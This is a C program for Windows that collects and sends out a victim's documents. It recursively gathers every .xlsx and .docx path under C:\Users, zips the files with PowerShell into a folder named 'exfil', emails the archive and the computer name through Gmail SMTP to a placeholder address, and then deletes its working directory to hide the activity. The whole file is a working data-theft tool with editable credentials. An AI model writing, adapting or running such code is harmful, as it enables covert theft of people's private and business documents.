#include <windows.h>
#include <stdio.h>
#include <time.h>

#define WORKDIR "C:\\Windows\\Temp\\exfil"
const char *exts[] = {"xlsx", "docx"};  // Only these two types
int ext_count = 2;

void search_files(const char *basePath, FILE *listFile) {
    char searchPath[MAX_PATH];
    WIN32_FIND_DATA ffd;
    HANDLE hFind;

    snprintf(searchPath, MAX_PATH, "%s\\*", basePath);
    hFind = FindFirstFile(searchPath, &ffd);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) continue;

        char fullPath[MAX_PATH];
        snprintf(fullPath, MAX_PATH, "%s\\%s", basePath, ffd.cFileName);

        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            search_files(fullPath, listFile);
        } else {
            for (int i = 0; i < ext_count; i++) {
                char *dot = strrchr(ffd.cFileName, '.');
                if (dot && _stricmp(dot + 1, exts[i]) == 0) {
                    fprintf(listFile, "%s\n", fullPath);
                    break;
                }
            }
        }
    } while (FindNextFile(hFind, &ffd) != 0);

    FindClose(hFind);
}

int main() {
    time_t now = time(NULL);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", localtime(&now));

    // Create work dir
    CreateDirectory(WORKDIR, NULL);

    // File list
    char listPath[MAX_PATH];
    snprintf(listPath, MAX_PATH, "%s\\file_list.txt", WORKDIR);
    FILE *listFile = fopen(listPath, "w");
    if (!listFile) return 1;

    // Search in C:\Users
    search_files("C:\\Users", listFile);
    fclose(listFile);

    // Archive path
    char archivePath[MAX_PATH];
    snprintf(archivePath, MAX_PATH, "%s\\exfil_%s.zip", WORKDIR, timestamp);

    // Zip with built-in PowerShell
    char zipCmd[2048];
    snprintf(zipCmd, sizeof(zipCmd),
        "powershell -NoP -NonI -Command \"Get-Content '%s' | Compress-Archive -DestinationPath '%s' -Force\"",
        listPath, archivePath);
    system(zipCmd);

    // Email sending (Edit SMTP settings here)
    // Example for Gmail - you need an App Password (not normal password)
    char mailCmd[4096];
    snprintf(mailCmd, sizeof(mailCmd),
        "powershell -NoP -NonI -Command \"Send-MailMessage "
        "-From 'yourmail@gmail.com' -To 'yourmail@gmail.com' "
        "-Subject 'Exfil %s' -Body 'Collected xlsx/docx files from %s' "
        "-Attachments '%s' "
        "-SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl "
        "-Credential (New-Object PSCredential('yourmail@gmail.com', "
        "(ConvertTo-SecureString 'your app password' -AsPlainText -Force)))\"",
        timestamp, getenv("COMPUTERNAME"), archivePath);
    system(mailCmd);

    // Cleanup
    char delCmd[256];
    snprintf(delCmd, sizeof(delCmd), "cmd /c rmdir /s /q \"%s\"", WORKDIR);
    system(delCmd);

    return 0;
}
